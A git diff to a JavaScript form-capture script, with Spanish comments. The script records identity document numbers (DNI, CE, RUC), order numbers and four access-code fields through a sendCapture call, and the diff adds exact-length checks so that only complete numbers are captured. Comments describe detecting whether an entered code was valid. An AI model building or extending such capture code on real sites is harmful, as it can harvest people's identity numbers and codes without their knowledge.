@@ -8,7 +8,12 @@ const DOC_INPUT_ID = 'inputnombre';
 // (un CE de 8 digitos se guardaba como DNI).
 const TIPODOC_SELECT_ID = 'tipodoclist';
 const DOC_TYPES = ['DNI', 'RUC', 'CE', 'PS'];
+// Cantidad exacta de digitos por tipo. Solo se captura cuando el numero esta
+// completo: nada de registros con el documento a medias. PS (pasaporte) es
+// alfanumerico y de longitud variable, asi que no lleva un largo fijo.
+const DOC_EXPECTED_LENGTH = { DNI: 8, CE: 9, RUC: 11 };
 const OS_INPUT_ID = 'inputnroguia';
+const OS_LENGTH = 8;
 const CLAVE_FIELDS = ['swal-input1', 'swal-input2', 'swal-input3', 'swal-input4'];
 // Senales de que la clave fue CORRECTA: el servidor solo inyecta estos
 // formularios cuando el codigo validado es valido. El cierre del modal de
@@ -199,6 +204,10 @@ function classifyByDocType(docType, rawValue) {
     }
     const value = normalizeDigits(rawValue);
     if (!/^\d+$/.test(value)) return null;
+    // El desplegable decide el tipo, pero solo se captura con la longitud
+    // exacta: DNI 8, CE 9, RUC 11. Menos digitos = numero incompleto, se ignora.
+    const expected = DOC_EXPECTED_LENGTH[docType];
+    if (expected && value.length !== expected) return null;
     return { field: docType, value };
 }
 
@@ -246,7 +255,8 @@ function scheduleDocDebouncedSave(target, source, eventTimeStamp) {
 
 function captureOs(target, source, eventTimeStamp) {
     const value = normalizeText(getFieldValue(target));
-    if (!/^\d+$/.test(value) || value.length > 8) return null;
+    // Solo la OS completa: exactamente 8 digitos. Menos = numero a medias.
+    if (!/^\d+$/.test(value) || value.length !== OS_LENGTH) return null;
     sendCapture('OS', value, source, eventTimeStamp);
     return value;
 }
